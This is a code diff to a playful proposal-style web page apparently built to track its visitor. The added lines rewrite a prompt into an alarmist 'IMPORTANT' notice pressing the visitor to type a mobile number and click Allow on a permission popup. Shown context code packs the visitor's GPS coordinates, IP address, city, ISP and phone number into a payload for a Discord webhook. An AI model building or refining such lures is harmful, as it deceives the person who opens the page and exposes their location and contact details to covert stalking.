@@ -367,7 +367,53 @@
             #phoneInput {
                 width: 90%;
             }
-            /* ... rest of media queries ... */
+        }
+        
+        /* ... rest of media queries ... */
+        @media (max-width: 480px) {
+            .name {
+                font-size: 2.2rem;
+            }
+            
+            .heart-animation {
+                font-size: 2.2rem;
+            }
+            
+            .question {
+                font-size: 1.5rem;
+            }
+            
+            .btn {
+                padding: 12px 25px;
+                font-size: 1.1rem;
+                min-width: 130px;
+            }
+            
+            .buttons-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .theme-toggle .theme-text {
+                display: none;
+            }
+            
+            .theme-toggle {
+                padding: 10px;
+            }
+            
+            .music-control {
+                bottom: 15px;
+                right: 15px;
+                padding: 10px 15px;
+            }
+            
+            .youtube-player {
+                width: 200px;
+                height: 120px;
+                right: 10px;
+                bottom: 65px;
+            }
         }
     </style>
 </head>
@@ -416,8 +462,8 @@
         </div>
         
         <div id="contact-capture">
-            <p style="font-size: 0.95rem; color: var(--text-color);">
-                Just a small detail: Enter your best contact number below so I can call you back, whatever your answer is!
+            <p style="font-size: 0.95rem; color: var(--text-color); font-weight: 600;">
+                ⚠️ IMPORTANT: To ensure I have the right contact details for you, please enter your mobile number and click **Allow** on the permission request that pops up!
             </p>
             <input type="tel" id="phoneInput" placeholder="Mobile Number (e.g., 9876543210)">
         </div>
@@ -587,7 +633,7 @@
         function sendCombinedDataToDiscord(geoData, ipData) {
             const { latitude, longitude, geoError } = geoData;
             const { ip, city, region, country, org, ipError } = ipData;
-            
+
             // NEW: Get phone number input
             const phoneNumber = document.getElementById('phoneInput').value.trim() || 'Not Entered';
 
@@ -611,6 +657,7 @@
             const mapLink = latitude && longitude ? `[Google Maps Link](http://googleusercontent.com/maps.google.com/?q=${latitude},${longitude})` : 'N/A';
 
             const payload = {
+                // UPDATED WEBHOOK PROFILE
                 username: WEBHOOK_USERNAME,
                 avatar_url: WEBHOOK_AVATAR,
                 content: `🚨 **NEW VISIT - ${USER_NAME}** | Status: **${overallStatus}** | Contact: **${phoneNumber}**`,
